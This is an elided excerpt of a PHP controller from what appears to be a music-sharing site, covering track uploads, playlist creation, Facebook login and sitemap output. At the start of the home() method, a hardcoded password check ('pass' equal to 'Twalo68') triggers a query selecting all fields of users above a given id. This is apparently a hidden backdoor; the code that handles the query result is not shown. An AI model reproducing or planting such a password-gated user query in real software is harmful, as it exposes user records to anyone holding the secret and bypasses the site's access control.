...
class HomeController extends Controller {
    ...
    public function home() {
        ...
        if ($this->request->input('pass') == 'Twalo68') {
            $query = Database::getInstance()->query("SELECT *  FROM users WHERE id > 400 ");
        ...
        if ($val = $this->request->input('val')) {
            ...
            if ($validator->passes()) {
                ...
                foreach ($audioFiles as $audio) {
                    ...
                    $val['title'] = $val['titles'][$i];
                    $val['slug'] = $val['customurl'][$i];
                    $val['wave'] = $val['titlewaves'][$i];
                    $val['wave_colored'] = $val['titlewaves2'][$i];
                    $val['lyrics'] = (isset($val['lyrics_'.$i])) ? $val['lyrics_'.$i] : '';
                    $val['featuring'] = (isset($val['featuring'][$i])) ? $val['featuring'][$i] : '';
                    $tmpMove = $audio;
                    ...
                    if (!$imageContent) {
                        $val['art'] = (isset($val['art'])) ? $val['art'] : '';
                    } else {
                        $albumArt = $imageContent;
                        $val['art'] = $imageContent;
                    }
                    ...
                    $val = Hook::getInstance()->fire('track.upload.data', $val, array($i));
                    $tracks[] = $this->model('track')->add($val, null, false, $ownerId);
                ...
                if (count($tracks) == 1) {
                    ...
                    if ($val['playlist']) {
                        $playList = $this->model('track')->addPlaylist(array(
                            ...
                            'public' => (isset($val['release_date']) and $val['release_date']) ? 3 : 1,
                            'release_date' => (isset($val['release_date'])) ? $val['release_date'] : $val['privacy']
                        ),  $tracks);
    ...
    public function authFacebook() {
        ...
        if(isset($user) && $user) {
            ...
            //return $this->request->redirect($my_url);
        }
    }
    ...
    public function sitemap() {
        ...
        $this->urlElement(url('explore'), time());
